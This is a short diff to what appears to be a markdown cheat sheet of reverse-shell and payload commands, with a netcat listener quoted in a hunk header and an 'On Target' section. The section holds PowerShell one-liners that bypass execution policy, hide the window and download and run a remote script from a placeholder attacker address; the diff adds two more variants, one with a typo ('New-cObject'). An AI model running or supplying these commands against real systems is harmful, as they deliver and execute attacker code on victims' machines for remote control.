@@ -93,7 +93,7 @@ nc -nlvp REVERSE_PORT
 <details>
 <summary><u>On Target</u></summary>
 <p>
-REVERSE_PORT - Port to listen for connection in
+REVERSE_IP -ip to go to get to web server
 <br>
 MY_WEBPORT - Port of web server on your host
 <br>
@@ -103,6 +103,8 @@ MY_SCRIPT - Name of script you are hosting that powershell will execute to get t
 
 ```
 powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://REVERSE_IP:MY_WEBPORT/MY_SCRIPT.ps1'); MY_SCRIPT.ps1"
+powershell.exe iex(New-Object System.Net.WebClient).DownloadString('http://REVERSE_IP:MY_WEBPORT/MY_SCRIPT.ps1')
+cmd /c powershell iex(New-cObject System.Net.Webclient).DownloadString('http://REVERSE_IP:MY_WEBPORT/MY_SCRIPT.ps1')
 ```
 
 **Generic**
